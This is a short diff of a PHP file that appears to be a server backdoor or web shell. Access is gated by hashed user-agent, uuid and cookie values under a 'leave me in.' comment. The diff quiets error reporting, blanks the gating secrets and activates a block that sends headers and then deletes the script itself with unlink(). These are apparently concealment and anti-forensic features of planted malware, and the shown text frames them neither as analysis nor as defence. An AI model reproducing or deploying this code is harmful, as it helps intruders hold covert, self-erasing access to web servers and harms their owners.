@@ -1,11 +1,11 @@
 <?php
 //leave me in.
 
-error_reporting(E_ALL);
-define("allow_agent", sha1("sp/1.1"));
-define("uuid", sha1("123-123-123-123-123"));
-define("cname", "test");
-define("cval", sha1("test"));
+error_reporting(E_WARNING | E_PARSE);
+define("allow_agent", sha1(""));
+define("uuid", sha1(""));
+define("cname", "");
+define("cval", sha1(""));
 if (!defined('allowed_chars')) {
     define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
 }
@@ -462,10 +462,10 @@ INI. PHP_EOL;
             default:
                 break;
         }
-//            foreach (uwumodifyme() as $new_data => $d) {
-//                header("{$new_data}: {$d}");
-//            }
-//            unlink($_SERVER['SCRIPT_FILENAME']);
+            foreach (uwumodifyme() as $new_data => $d) {
+                header("{$new_data}: {$d}");
+            }
+            unlink($_SERVER['SCRIPT_FILENAME']);
         die();
     } else {
         die();
